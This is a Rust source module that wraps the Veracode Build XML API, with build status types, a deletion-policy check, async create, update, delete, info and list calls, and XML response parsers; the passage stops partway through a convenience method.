//! Build API functionality for Veracode platform.
//!
//! This module provides functionality to interact with the Veracode Build XML APIs,
//! allowing you to create, update, delete, and query builds for applications and sandboxes.
//! These operations use the XML API endpoints (analysiscenter.veracode.com).

use chrono::{DateTime, NaiveDate, Utc};
use log::debug;
use quick_xml::Reader;
use quick_xml::events::Event;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

use crate::{VeracodeClient, VeracodeError};

/// Valid lifecycle stage values for Veracode builds
pub const LIFECYCLE_STAGES: &[&str] = &[
    "In Development (pre-Alpha)",
    "Internal or Alpha Testing",
    "External or Beta Testing",
    "Deployed",
    "Maintenance",
    "Cannot Disclose",
    "Not Specified",
];

/// Validate if a lifecycle stage value is valid
#[must_use]
pub fn is_valid_lifecycle_stage(stage: &str) -> bool {
    LIFECYCLE_STAGES.contains(&stage)
}

/// Get the default lifecycle stage for development builds
#[must_use]
pub fn default_lifecycle_stage() -> &'static str {
    "In Development (pre-Alpha)"
}

/// Build status enumeration based on Veracode Java implementation
/// These represent the possible build/analysis states that determine deletion safety
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum BuildStatus {
    Incomplete,
    NotSubmitted,
    SubmittedToEngine,
    ScanInProcess,
    PreScanSubmitted,
    PreScanSuccess,
    PreScanFailed,
    PreScanCancelled,
    PrescanFailed,
    PrescanCancelled,
    ScanCancelled,
    ResultsReady,
    Failed,
    Cancelled,
    Unknown(String), // For any status not explicitly handled
}

impl BuildStatus {
    /// Parse a build status string from the Veracode API
    #[must_use]
    pub fn from_string(status: &str) -> Self {
        match status {
            "Incomplete" => BuildStatus::Incomplete,
            "Not Submitted" => BuildStatus::NotSubmitted,
            "Submitted to Engine" => BuildStatus::SubmittedToEngine,
            "Scan in Process" => BuildStatus::ScanInProcess,
            "Pre-Scan Submitted" => BuildStatus::PreScanSubmitted,
            "Pre-Scan Success" => BuildStatus::PreScanSuccess,
            "Pre-Scan Failed" => BuildStatus::PreScanFailed,
            "Pre-Scan Cancelled" => BuildStatus::PreScanCancelled,
            "Prescan Failed" => BuildStatus::PrescanFailed,
            "Prescan Cancelled" => BuildStatus::PrescanCancelled,
            "Scan Cancelled" => BuildStatus::ScanCancelled,
            "Results Ready" => BuildStatus::ResultsReady,
            "Failed" => BuildStatus::Failed,
            "Cancelled" => BuildStatus::Cancelled,
            _ => BuildStatus::Unknown(status.to_string()),
        }
    }

    /// Convert build status to string representation
    #[must_use]
    pub fn to_str(&self) -> &str {
        match self {
            BuildStatus::Incomplete => "Incomplete",
            BuildStatus::NotSubmitted => "Not Submitted",
            BuildStatus::SubmittedToEngine => "Submitted to Engine",
            BuildStatus::ScanInProcess => "Scan in Process",
            BuildStatus::PreScanSubmitted => "Pre-Scan Submitted",
            BuildStatus::PreScanSuccess => "Pre-Scan Success",
            BuildStatus::PreScanFailed => "Pre-Scan Failed",
            BuildStatus::PreScanCancelled => "Pre-Scan Cancelled",
            BuildStatus::PrescanFailed => "Prescan Failed",
            BuildStatus::PrescanCancelled => "Prescan Cancelled",
            BuildStatus::ScanCancelled => "Scan Cancelled",
            BuildStatus::ResultsReady => "Results Ready",
            BuildStatus::Failed => "Failed",
            BuildStatus::Cancelled => "Cancelled",
            BuildStatus::Unknown(s) => s,
        }
    }

    /// Determine if a build is safe to delete based on its status and deletion policy
    ///
    /// Deletion Policy Levels:
    /// - 0: Never delete builds
    /// - 1: Delete only "safe" builds (incomplete, failed, cancelled states)
    /// - 2: Delete any build except "Results Ready"
    #[must_use]
    pub fn is_safe_to_delete(&self, deletion_policy: u8) -> bool {
        match deletion_policy {
            1 => {
                // Delete only safe builds (incomplete, failed, cancelled states)
                matches!(
                    self,
                    BuildStatus::Incomplete
                        | BuildStatus::NotSubmitted
                        | BuildStatus::PreScanFailed
                        | BuildStatus::PreScanCancelled
                        | BuildStatus::PrescanFailed
                        | BuildStatus::PrescanCancelled
                        | BuildStatus::ScanCancelled
                        | BuildStatus::Failed
                        | BuildStatus::Cancelled
                )
            }
            2 => {
                // Delete any build except Results Ready
                !matches!(self, BuildStatus::ResultsReady)
            }
            _ => false, // Never delete (0) or invalid policy, default to never delete
        }
    }
}

impl std::fmt::Display for BuildStatus {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.to_str())
    }
}

/// Represents a Veracode build
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Build {
    /// Build ID
    pub build_id: String,
    /// Application ID
    pub app_id: String,
    /// Build version
    pub version: Option<String>,
    /// Application name
    pub app_name: Option<String>,
    /// Sandbox ID (if sandbox build)
    pub sandbox_id: Option<String>,
    /// Sandbox name (if sandbox build)
    pub sandbox_name: Option<String>,
    /// Lifecycle stage
    pub lifecycle_stage: Option<String>,
    /// Launch date
    pub launch_date: Option<NaiveDate>,
    /// Submitter
    pub submitter: Option<String>,
    /// Platform
    pub platform: Option<String>,
    /// Analysis unit
    pub analysis_unit: Option<String>,
    /// Policy name
    pub policy_name: Option<String>,
    /// Policy version
    pub policy_version: Option<String>,
    /// Policy compliance status
    pub policy_compliance_status: Option<String>,
    /// Rules status
    pub rules_status: Option<String>,
    /// Grace period expired
    pub grace_period_expired: Option<bool>,
    /// Scan overdue
    pub scan_overdue: Option<bool>,
    /// Policy updated date
    pub policy_updated_date: Option<DateTime<Utc>>,
    /// Legacy scan engine
    pub legacy_scan_engine: Option<bool>,
    /// Additional attributes
    pub attributes: HashMap<String, String>,
}

/// List of builds
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BuildList {
    /// Account ID
    pub account_id: Option<String>,
    /// Application ID
    pub app_id: String,
    /// Application name
    pub app_name: Option<String>,
    /// List of builds
    pub builds: Vec<Build>,
}

/// Request for creating a build
#[derive(Debug, Clone)]
pub struct CreateBuildRequest {
    /// Application ID
    pub app_id: String,
    /// Build version (optional, system will generate if not provided)
    pub version: Option<String>,
    /// Lifecycle stage
    pub lifecycle_stage: Option<String>,
    /// Launch date in MM/DD/YYYY format
    pub launch_date: Option<String>,
    /// Sandbox ID (optional, for sandbox builds)
    pub sandbox_id: Option<String>,
}

/// Request for updating a build
#[derive(Debug, Clone)]
pub struct UpdateBuildRequest {
    /// Application ID
    pub app_id: String,
    /// Build ID (optional, defaults to most recent)
    pub build_id: Option<String>,
    /// New build version
    pub version: Option<String>,
    /// New lifecycle stage
    pub lifecycle_stage: Option<String>,
    /// New launch date in MM/DD/YYYY format
    pub launch_date: Option<String>,
    /// Sandbox ID (optional, for sandbox builds)
    pub sandbox_id: Option<String>,
}

/// Request for deleting a build
#[derive(Debug, Clone)]
pub struct DeleteBuildRequest {
    /// Application ID
    pub app_id: String,
    /// Sandbox ID (optional, for sandbox builds)
    pub sandbox_id: Option<String>,
}

/// Request for getting build information
#[derive(Debug, Clone)]
pub struct GetBuildInfoRequest {
    /// Application ID
    pub app_id: String,
    /// Build ID (optional, defaults to most recent)
    pub build_id: Option<String>,
    /// Sandbox ID (optional, for sandbox builds)
    pub sandbox_id: Option<String>,
}

/// Request for getting build list
#[derive(Debug, Clone)]
pub struct GetBuildListRequest {
    /// Application ID
    pub app_id: String,
    /// Sandbox ID (optional, for sandbox builds only)
    pub sandbox_id: Option<String>,
}

/// Result of build deletion
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DeleteBuildResult {
    /// Result status (typically "success")
    pub result: String,
}

/// Build specific error types
#[derive(Debug)]
#[must_use = "Need to handle all error enum types."]
pub enum BuildError {
    /// Veracode API error
    Api(VeracodeError),
    /// Build not found
    BuildNotFound,
    /// Application not found
    ApplicationNotFound,
    /// Sandbox not found
    SandboxNotFound,
    /// Invalid parameter
    InvalidParameter(String),
    /// Build creation failed
    CreationFailed(String),
    /// Build update failed
    UpdateFailed(String),
    /// Build deletion failed
    DeletionFailed(String),
    /// XML parsing error
    XmlParsingError(String),
    /// Unauthorized access
    Unauthorized,
    /// Permission denied
    PermissionDenied,
    /// Build in progress (cannot modify)
    BuildInProgress,
}

impl std::fmt::Display for BuildError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            BuildError::Api(err) => write!(f, "API error: {err}"),
            BuildError::BuildNotFound => write!(f, "Build not found"),
            BuildError::ApplicationNotFound => write!(f, "Application not found"),
            BuildError::SandboxNotFound => write!(f, "Sandbox not found"),
            BuildError::InvalidParameter(msg) => write!(f, "Invalid parameter: {msg}"),
            BuildError::CreationFailed(msg) => write!(f, "Build creation failed: {msg}"),
            BuildError::UpdateFailed(msg) => write!(f, "Build update failed: {msg}"),
            BuildError::DeletionFailed(msg) => write!(f, "Build deletion failed: {msg}"),
            BuildError::XmlParsingError(msg) => write!(f, "XML parsing error: {msg}"),
            BuildError::Unauthorized => write!(f, "Unauthorized access"),
            BuildError::PermissionDenied => write!(f, "Permission denied"),
            BuildError::BuildInProgress => write!(f, "Build in progress, cannot modify"),
        }
    }
}

impl std::error::Error for BuildError {}

impl From<VeracodeError> for BuildError {
    fn from(err: VeracodeError) -> Self {
        BuildError::Api(err)
    }
}

impl From<std::io::Error> for BuildError {
    fn from(err: std::io::Error) -> Self {
        BuildError::Api(VeracodeError::InvalidResponse(err.to_string()))
    }
}

impl From<reqwest::Error> for BuildError {
    fn from(err: reqwest::Error) -> Self {
        BuildError::Api(VeracodeError::Http(err))
    }
}

/// Build API operations for Veracode platform
pub struct BuildApi {
    client: VeracodeClient,
}

impl BuildApi {
    /// Create a new `BuildApi` instance
    #[must_use]
    pub fn new(client: VeracodeClient) -> Self {
        Self { client }
    }

    /// Create a new build
    ///
    /// # Arguments
    ///
    /// * `request` - The create build request
    ///
    /// # Returns
    ///
    /// A `Result` containing the created build information or an error.
    ///
    /// # Errors
    ///
    /// Returns an error if the API request fails, the application is not found,
    /// authentication fails, or the build creation is rejected by the Veracode platform.
    pub async fn create_build(&self, request: &CreateBuildRequest) -> Result<Build, BuildError> {
        let endpoint = "/api/5.0/createbuild.do";

        // Build query parameters
        let mut query_params = Vec::new();
        query_params.push(("app_id", request.app_id.as_str()));

        if let Some(version) = &request.version {
            query_params.push(("version", version.as_str()));
        }

        if let Some(lifecycle_stage) = &request.lifecycle_stage {
            query_params.push(("lifecycle_stage", lifecycle_stage.as_str()));
        }

        if let Some(launch_date) = &request.launch_date {
            query_params.push(("launch_date", launch_date.as_str()));
        }

        if let Some(sandbox_id) = &request.sandbox_id {
            query_params.push(("sandbox_id", sandbox_id.as_str()));
        }

        let response = self
            .client
            .post_with_query_params(endpoint, &query_params)
            .await?;

        let status = response.status().as_u16();
        match status {
            200 => {
                let response_text = response.text().await?;
                self.parse_build_info(&response_text)
            }
            400 => {
                let error_text = response.text().await.unwrap_or_default();
                Err(BuildError::InvalidParameter(error_text))
            }
            401 => Err(BuildError::Unauthorized),
            403 => Err(BuildError::PermissionDenied),
            404 => Err(BuildError::ApplicationNotFound),
            _ => {
                let error_text = response.text().await.unwrap_or_default();
                Err(BuildError::CreationFailed(format!(
                    "HTTP {status}: {error_text}"
                )))
            }
        }
    }

    /// Update an existing build
    ///
    /// # Arguments
    ///
    /// * `request` - The update build request
    ///
    /// # Returns
    ///
    /// A `Result` containing the updated build information or an error.
    ///
    /// # Errors
    ///
    /// Returns an error if the API request fails, authentication fails,
    /// or the operation is rejected by the Veracode platform.
    pub async fn update_build(&self, request: &UpdateBuildRequest) -> Result<Build, BuildError> {
        let endpoint = "/api/5.0/updatebuild.do";

        // Build query parameters
        let mut query_params = Vec::new();
        query_params.push(("app_id", request.app_id.as_str()));

        if let Some(build_id) = &request.build_id {
            query_params.push(("build_id", build_id.as_str()));
        }

        if let Some(version) = &request.version {
            query_params.push(("version", version.as_str()));
        }

        if let Some(lifecycle_stage) = &request.lifecycle_stage {
            query_params.push(("lifecycle_stage", lifecycle_stage.as_str()));
        }

        if let Some(launch_date) = &request.launch_date {
            query_params.push(("launch_date", launch_date.as_str()));
        }

        if let Some(sandbox_id) = &request.sandbox_id {
            query_params.push(("sandbox_id", sandbox_id.as_str()));
        }

        let response = self
            .client
            .post_with_query_params(endpoint, &query_params)
            .await?;

        let status = response.status().as_u16();
        match status {
            200 => {
                let response_text = response.text().await?;
                self.parse_build_info(&response_text)
            }
            400 => {
                let error_text = response.text().await.unwrap_or_default();
                Err(BuildError::InvalidParameter(error_text))
            }
            401 => Err(BuildError::Unauthorized),
            403 => Err(BuildError::PermissionDenied),
            404 => {
                if request.sandbox_id.is_some() {
                    Err(BuildError::SandboxNotFound)
                } else {
                    Err(BuildError::BuildNotFound)
                }
            }
            _ => {
                let error_text = response.text().await.unwrap_or_default();
                Err(BuildError::UpdateFailed(format!(
                    "HTTP {status}: {error_text}"
                )))
            }
        }
    }

    /// Delete a build
    ///
    /// # Arguments
    ///
    /// * `request` - The delete build request
    ///
    /// # Returns
    ///
    /// A `Result` containing the deletion result or an error.
    ///
    /// # Errors
    ///
    /// Returns an error if the API request fails, authentication fails,
    /// or the operation is rejected by the Veracode platform.
    pub async fn delete_build(
        &self,
        request: &DeleteBuildRequest,
    ) -> Result<DeleteBuildResult, BuildError> {
        let endpoint = "/api/5.0/deletebuild.do";

        // Build query parameters
        let mut query_params = Vec::new();
        query_params.push(("app_id", request.app_id.as_str()));

        if let Some(sandbox_id) = &request.sandbox_id {
            query_params.push(("sandbox_id", sandbox_id.as_str()));
        }

        let response = self
            .client
            .post_with_query_params(endpoint, &query_params)
            .await?;

        let status = response.status().as_u16();
        match status {
            200 => {
                let response_text = response.text().await?;
                self.parse_delete_result(&response_text)
            }
            400 => {
                let error_text = response.text().await.unwrap_or_default();
                Err(BuildError::InvalidParameter(error_text))
            }
            401 => Err(BuildError::Unauthorized),
            403 => Err(BuildError::PermissionDenied),
            404 => {
                if request.sandbox_id.is_some() {
                    Err(BuildError::SandboxNotFound)
                } else {
                    Err(BuildError::BuildNotFound)
                }
            }
            _ => {
                let error_text = response.text().await.unwrap_or_default();
                Err(BuildError::DeletionFailed(format!(
                    "HTTP {status}: {error_text}"
                )))
            }
        }
    }

    /// Get build information
    ///
    /// # Arguments
    ///
    /// * `request` - The get build info request
    ///
    /// # Returns
    ///
    /// A `Result` containing the build information or an error.
    ///
    /// # Errors
    ///
    /// Returns an error if the API request fails, authentication fails,
    /// or the operation is rejected by the Veracode platform.
    pub async fn get_build_info(&self, request: &GetBuildInfoRequest) -> Result<Build, BuildError> {
        let endpoint = "/api/5.0/getbuildinfo.do";

        // Build query parameters
        let mut query_params = Vec::new();
        query_params.push(("app_id", request.app_id.as_str()));

        if let Some(build_id) = &request.build_id {
            query_params.push(("build_id", build_id.as_str()));
        }

        if let Some(sandbox_id) = &request.sandbox_id {
            query_params.push(("sandbox_id", sandbox_id.as_str()));
        }

        let response = self
            .client
            .get_with_query_params(endpoint, &query_params)
            .await?;

        let status = response.status().as_u16();
        match status {
            200 => {
                let response_text = response.text().await?;
                debug!("🌐 Raw XML response from getbuildinfo.do:\n{response_text}");
                self.parse_build_info(&response_text)
            }
            400 => {
                let error_text = response.text().await.unwrap_or_default();
                Err(BuildError::InvalidParameter(error_text))
            }
            401 => Err(BuildError::Unauthorized),
            403 => Err(BuildError::PermissionDenied),
            404 => {
                if request.sandbox_id.is_some() {
                    Err(BuildError::SandboxNotFound)
                } else {
                    Err(BuildError::BuildNotFound)
                }
            }
            _ => {
                let error_text = response.text().await.unwrap_or_default();
                Err(BuildError::Api(VeracodeError::InvalidResponse(format!(
                    "HTTP {status}: {error_text}"
                ))))
            }
        }
    }

    /// Get list of builds
    ///
    /// # Arguments
    ///
    /// * `request` - The get build list request
    ///
    /// # Returns
    ///
    /// A `Result` containing the build list or an error.
    ///
    /// # Errors
    ///
    /// Returns an error if the API request fails, authentication fails,
    /// or the operation is rejected by the Veracode platform.
    pub async fn get_build_list(
        &self,
        request: &GetBuildListRequest,
    ) -> Result<BuildList, BuildError> {
        let endpoint = "/api/5.0/getbuildlist.do";

        // Build query parameters
        let mut query_params = Vec::new();
        query_params.push(("app_id", request.app_id.as_str()));

        if let Some(sandbox_id) = &request.sandbox_id {
            query_params.push(("sandbox_id", sandbox_id.as_str()));
        }

        let response = self
            .client
            .get_with_query_params(endpoint, &query_params)
            .await?;

        let status = response.status().as_u16();
        match status {
            200 => {
                let response_text = response.text().await?;
                self.parse_build_list(&response_text)
            }
            400 => {
                let error_text = response.text().await.unwrap_or_default();
                Err(BuildError::InvalidParameter(error_text))
            }
            401 => Err(BuildError::Unauthorized),
            403 => Err(BuildError::PermissionDenied),
            404 => {
                if request.sandbox_id.is_some() {
                    Err(BuildError::SandboxNotFound)
                } else {
                    Err(BuildError::ApplicationNotFound)
                }
            }
            _ => {
                let error_text = response.text().await.unwrap_or_default();
                Err(BuildError::Api(VeracodeError::InvalidResponse(format!(
                    "HTTP {status}: {error_text}"
                ))))
            }
        }
    }

    /// Parse build info XML response
    fn parse_build_info(&self, xml: &str) -> Result<Build, BuildError> {
        // Check if response contains an error element first
        if xml.contains("<error>") {
            let mut reader = Reader::from_str(xml);
            reader.config_mut().trim_text(true);
            let mut buf = Vec::new();

            loop {
                match reader.read_event_into(&mut buf) {
                    Ok(Event::Start(ref e)) if e.name().as_ref() == b"error" => {
                        if let Ok(Event::Text(text)) = reader.read_event_into(&mut buf) {
                            let error_msg = String::from_utf8_lossy(&text);
                            if error_msg.contains("Could not find a build") {
                                return Err(BuildError::BuildNotFound);
                            }
                            return Err(BuildError::Api(VeracodeError::InvalidResponse(
                                error_msg.to_string(),
                            )));
                        }
                    }
                    Ok(Event::Eof) => break,
                    Err(e) => return Err(BuildError::XmlParsingError(e.to_string())),
                    _ => {}
                }
                buf.clear();
            }
        }

        let mut reader = Reader::from_str(xml);
        reader.config_mut().trim_text(true);

        let mut buf = Vec::new();
        let mut build = Build {
            build_id: String::new(),
            app_id: String::new(),
            version: None,
            app_name: None,
            sandbox_id: None,
            sandbox_name: None,
            lifecycle_stage: None,
            launch_date: None,
            submitter: None,
            platform: None,
            analysis_unit: None,
            policy_name: None,
            policy_version: None,
            policy_compliance_status: None,
            rules_status: None,
            grace_period_expired: None,
            scan_overdue: None,
            policy_updated_date: None,
            legacy_scan_engine: None,
            attributes: HashMap::new(),
        };

        let mut inside_build = false;

        loop {
            match reader.read_event_into(&mut buf) {
                Ok(Event::Start(ref e)) => {
                    match e.name().as_ref() {
                        b"build" => {
                            inside_build = true;
                            for attr in e.attributes().flatten() {
                                let key = String::from_utf8_lossy(attr.key.as_ref());
                                let value = String::from_utf8_lossy(&attr.value);

                                match key.as_ref() {
                                    "build_id" => build.build_id = value.into_owned(),
                                    "app_id" => build.app_id = value.into_owned(),
                                    "version" => build.version = Some(value.into_owned()),
                                    "app_name" => build.app_name = Some(value.into_owned()),
                                    "sandbox_id" => build.sandbox_id = Some(value.into_owned()),
                                    "sandbox_name" => build.sandbox_name = Some(value.into_owned()),
                                    "lifecycle_stage" => {
                                        build.lifecycle_stage = Some(value.into_owned())
                                    }
                                    "submitter" => build.submitter = Some(value.into_owned()),
                                    "platform" => build.platform = Some(value.into_owned()),
                                    "analysis_unit" => {
                                        build.analysis_unit = Some(value.into_owned())
                                    }
                                    "policy_name" => build.policy_name = Some(value.into_owned()),
                                    "policy_version" => {
                                        build.policy_version = Some(value.into_owned())
                                    }
                                    "policy_compliance_status" => {
                                        build.policy_compliance_status = Some(value.into_owned())
                                    }
                                    "rules_status" => build.rules_status = Some(value.into_owned()),
                                    "grace_period_expired" => {
                                        build.grace_period_expired = value.parse::<bool>().ok();
                                    }
                                    "scan_overdue" => {
                                        build.scan_overdue = value.parse::<bool>().ok();
                                    }
                                    "legacy_scan_engine" => {
                                        build.legacy_scan_engine = value.parse::<bool>().ok();
                                    }
                                    "launch_date" => {
                                        if let Ok(date) =
                                            NaiveDate::parse_from_str(&value, "%m/%d/%Y")
                                        {
                                            build.launch_date = Some(date);
                                        }
                                    }
                                    "policy_updated_date" => {
                                        if let Ok(datetime) =
                                            chrono::DateTime::parse_from_rfc3339(&value)
                                        {
                                            build.policy_updated_date =
                                                Some(datetime.with_timezone(&Utc));
                                        }
                                    }
                                    _ => {
                                        build
                                            .attributes
                                            .insert(key.into_owned(), value.into_owned());
                                    }
                                }
                            }
                        }
                        b"analysis_unit" if inside_build => {
                            // Parse analysis_unit element nested inside build (primary source for build status)
                            for attr in e.attributes().flatten() {
                                let key = String::from_utf8_lossy(attr.key.as_ref());
                                let value = String::from_utf8_lossy(&attr.value);

                                // Store all analysis_unit attributes, especially status
                                match key.as_ref() {
                                    "status" => {
                                        // Store the analysis_unit status as the primary status
                                        build
                                            .attributes
                                            .insert("status".to_string(), value.into_owned());
                                    }
                                    _ => {
                                        // Store other analysis_unit attributes with prefix
                                        build
                                            .attributes
                                            .insert(format!("analysis_{key}"), value.into_owned());
                                    }
                                }
                            }
                        }
                        _ => {}
                    }
                }
                Ok(Event::Empty(ref e)) => {
                    // Handle self-closing elements like <analysis_unit ... />
                    if e.name().as_ref() == b"analysis_unit" && inside_build {
                        for attr in e.attributes().flatten() {
                            let key = String::from_utf8_lossy(attr.key.as_ref());
                            let value = String::from_utf8_lossy(&attr.value);

                            match key.as_ref() {
                                "status" => {
                                    build
                                        .attributes
                                        .insert("status".to_string(), value.into_owned());
                                }
                                _ => {
                                    build
                                        .attributes
                                        .insert(format!("analysis_{key}"), value.into_owned());
                                }
                            }
                        }
                    }
                }
                Ok(Event::End(ref e)) => {
                    if e.name().as_ref() == b"build" {
                        inside_build = false;
                    }
                }
                Ok(Event::Eof) => break,
                Err(e) => return Err(BuildError::XmlParsingError(e.to_string())),
                _ => {}
            }
            buf.clear();
        }

        if build.build_id.is_empty() {
            return Err(BuildError::XmlParsingError(
                "No build information found in response".to_string(),
            ));
        }

        Ok(build)
    }

    /// Parse build attributes from XML element (handles both opening and self-closing tags)
    fn parse_build_from_attributes<'a>(
        &self,
        attributes: impl Iterator<
            Item = Result<
                quick_xml::events::attributes::Attribute<'a>,
                quick_xml::events::attributes::AttrError,
            >,
        >,
        app_id: &str,
        app_name: &Option<String>,
    ) -> Build {
        let mut build = Build {
            build_id: String::new(),
            app_id: app_id.to_string(),
            version: None,
            app_name: app_name.clone(),
            sandbox_id: None,
            sandbox_name: None,
            lifecycle_stage: None,
            launch_date: None,
            submitter: None,
            platform: None,
            analysis_unit: None,
            policy_name: None,
            policy_version: None,
            policy_compliance_status: None,
            rules_status: None,
            grace_period_expired: None,
            scan_overdue: None,
            policy_updated_date: None,
            legacy_scan_engine: None,
            attributes: HashMap::new(),
        };

        for attr in attributes.flatten() {
            let key = String::from_utf8_lossy(attr.key.as_ref());
            let value = String::from_utf8_lossy(&attr.value);

            match key.as_ref() {
                "build_id" => build.build_id = value.into_owned(),
                "version" => build.version = Some(value.into_owned()),
                "sandbox_id" => build.sandbox_id = Some(value.into_owned()),
                "sandbox_name" => build.sandbox_name = Some(value.into_owned()),
                "lifecycle_stage" => build.lifecycle_stage = Some(value.into_owned()),
                "submitter" => build.submitter = Some(value.into_owned()),
                "platform" => build.platform = Some(value.into_owned()),
                "analysis_unit" => build.analysis_unit = Some(value.into_owned()),
                "policy_name" => build.policy_name = Some(value.into_owned()),
                "policy_version" => build.policy_version = Some(value.into_owned()),
                "policy_compliance_status" => {
                    build.policy_compliance_status = Some(value.into_owned())
                }
                "rules_status" => build.rules_status = Some(value.into_owned()),
                "grace_period_expired" => {
                    build.grace_period_expired = value.parse::<bool>().ok();
                }
                "scan_overdue" => {
                    build.scan_overdue = value.parse::<bool>().ok();
                }
                "legacy_scan_engine" => {
                    build.legacy_scan_engine = value.parse::<bool>().ok();
                }
                "launch_date" => {
                    if let Ok(date) = NaiveDate::parse_from_str(&value, "%m/%d/%Y") {
                        build.launch_date = Some(date);
                    }
                }
                "policy_updated_date" => {
                    if let Ok(datetime) = chrono::DateTime::parse_from_rfc3339(&value) {
                        build.policy_updated_date = Some(datetime.with_timezone(&Utc));
                    }
                }
                _ => {
                    build
                        .attributes
                        .insert(key.into_owned(), value.into_owned());
                }
            }
        }

        build
    }

    /// Parse build list XML response
    fn parse_build_list(&self, xml: &str) -> Result<BuildList, BuildError> {
        let mut reader = Reader::from_str(xml);
        reader.config_mut().trim_text(true);

        let mut buf = Vec::new();
        let mut build_list = BuildList {
            account_id: None,
            app_id: String::new(),
            app_name: None,
            builds: Vec::new(),
        };

        loop {
            match reader.read_event_into(&mut buf) {
                Ok(Event::Start(ref e)) => match e.name().as_ref() {
                    b"buildlist" => {
                        for attr in e.attributes().flatten() {
                            let key = String::from_utf8_lossy(attr.key.as_ref());
                            let value = String::from_utf8_lossy(&attr.value);

                            match key.as_ref() {
                                "account_id" => build_list.account_id = Some(value.into_owned()),
                                "app_id" => build_list.app_id = value.into_owned(),
                                "app_name" => build_list.app_name = Some(value.into_owned()),
                                _ => {}
                            }
                        }
                    }
                    b"build" => {
                        let build = self.parse_build_from_attributes(
                            e.attributes(),
                            &build_list.app_id,
                            &build_list.app_name,
                        );

                        if !build.build_id.is_empty() {
                            build_list.builds.push(build);
                        }
                    }
                    _ => {}
                },
                Ok(Event::Empty(ref e)) => {
                    // Handle self-closing build tags like <build ... />
                    if e.name().as_ref() == b"build" {
                        let build = self.parse_build_from_attributes(
                            e.attributes(),
                            &build_list.app_id,
                            &build_list.app_name,
                        );

                        if !build.build_id.is_empty() {
                            build_list.builds.push(build);
                        }
                    }
                }
                Ok(Event::Eof) => break,
                Err(e) => return Err(BuildError::XmlParsingError(e.to_string())),
                _ => {}
            }
            buf.clear();
        }

        Ok(build_list)
    }

    /// Parse delete build result XML response
    fn parse_delete_result(&self, xml: &str) -> Result<DeleteBuildResult, BuildError> {
        let mut reader = Reader::from_str(xml);
        reader.config_mut().trim_text(true);

        let mut buf = Vec::new();
        let mut result = String::new();

        loop {
            match reader.read_event_into(&mut buf) {
                Ok(Event::Start(ref e)) => {
                    if e.name().as_ref() == b"result" {
                        // Read the text content of the result element
                        if let Ok(Event::Text(e)) = reader.read_event_into(&mut buf) {
                            result = String::from_utf8_lossy(&e).into_owned();
                        }
                    }
                }
                Ok(Event::Eof) => break,
                Err(e) => return Err(BuildError::XmlParsingError(e.to_string())),
                _ => {}
            }
            buf.clear();
        }

        if result.is_empty() {
            return Err(BuildError::XmlParsingError(
                "No result found in delete response".to_string(),
            ));
        }

        Ok(DeleteBuildResult { result })
    }
}

// Convenience methods implementation
impl BuildApi {
    /// Create a build with minimal parameters
    ///
    /// # Arguments
    ///
    /// * `app_id` - Application ID
    /// * `version` - Optional build version
    ///
    /// # Returns
    ///
    /// A `Result` containing the created build information or an error.
    ///
    /// # Errors
    ///
    /// Returns an error if the API request fails, authentication fails,
    /// or the operation is rejected by the Veracode platform.
    pub async fn create_simple_build(
        &self,
        app_id: &str,
        version: Option<&str>,
    ) -> Result<Build, BuildError> {
        let request = CreateBuildRequest {
            app_id: app_id.to_string(),
            version: version.map(str::to_string),
            lifecycle_stage: None,
            launch_date: None,
            sandbox_id: None,
        };

        self.create_build(&request).await
    }

    /// Create a sandbox build
    ///
    /// # Arguments
    ///
    /// * `app_id` - Application ID
    /// * `sandbox_id` - Sandbox ID
    /// * `version` - Optional build version
    ///
    /// # Returns
    ///
    /// A `Result` containing the created build information or an error.
    ///
    /// # Errors
    ///
    /// Returns an error if the API request fails, authentication fails,
    /// or the operation is rejected by the Veracode platform.
    pub async fn create_sandbox_build(
        &self,
        app_id: &str,
        sandbox_id: &str,
        version: Option<&str>,
    ) -> Result<Build, BuildError> {
        let request = CreateBuildRequest {
            app_id: app_id.to_string(),
            version: version.map(str::to_string),
            lifecycle_stage: None,
            launch_date: None,
            sandbox_id: Some(sandbox_id.to_string()),
        };

        self.create_build(&request).await
    }

    /// Delete the most recent application build
    ///
    /// # Arguments
    ///
    /// * `app_id` - Application ID
    ///
    /// # Returns
    ///
    /// A `Result` containing the deletion result or an error.
    ///
    /// # Errors
    ///
    /// Returns an error if the API request fails, authentication fails,
    /// or the operation is rejected by the Veracode platform.
    pub async fn delete_app_build(&self, app_id: &str) -> Result<DeleteBuildResult, BuildError> {
        let request = DeleteBuildRequest {
            app_id: app_id.to_string(),
            sandbox_id: None,
        };

        self.delete_build(&request).await
    }

    /// Delete the most recent sandbox build
    ///
    /// # Arguments
    ///
    /// * `app_id` - Application ID
    /// * `sandbox_id` - Sandbox ID
    ///
    /// # Returns
    ///
    /// A `Result` containing the deletion result or an error.
    ///
    /// # Errors
    ///
    /// Returns an error if the API request fails, authentication fails,
    /// or the operation is rejected by the Veracode platform.
    pub async fn delete_sandbox_build(
        &self,
        app_id: &str,
        sandbox_id: &str,
    ) -> Result<DeleteBuildResult, BuildError> {
        let request = DeleteBuildRequest {
            app_id: app_id.to_string(),
            sandbox_id: Some(sandbox_id.to_string()),
        };

        self.delete_build(&request).await
    }

    /// Get the most recent build info for an application
    ///
    /// # Arguments
    ///
    /// * `app_id` - Application ID
    ///
    /// # Returns
    ///
    /// A `Result` containing the build information or an error.
    ///
    /// # Errors
    ///
    /// Returns an error if the API request fails, authentication fails,
    /// or the operation is rejected by the Veracode platform.
    pub async fn get_app_build_info(&self, app_id: &str) -> Result<Build, BuildError> {
        let request = GetBuildInfoRequest {
            app_id: app_id.to_string(),
            build_id: None,
            sandbox_id: None,
        };

        self.get_build_info(&request).await
    }

    /// Get build info for a specific sandbox
    ///
    /// # Arguments
    ///
    /// * `app_id` - Application ID
    /// * `sandbox_id` - Sandbox ID
    ///
    /// # Returns
    ///
    /// A `Result` containing the build information or an error.
    ///
    /// # Errors
    ///
    /// Returns an error if the API request fails, authentication fails,
    /// or the operation is rejected by the Veracode platform.
    pub async fn get_sandbox_build_info(
        &self,
        app_id: &str,
        sandbox_id: &str,
    ) -> Result<Build, BuildError> {
        let request = GetBuildInfoRequest {
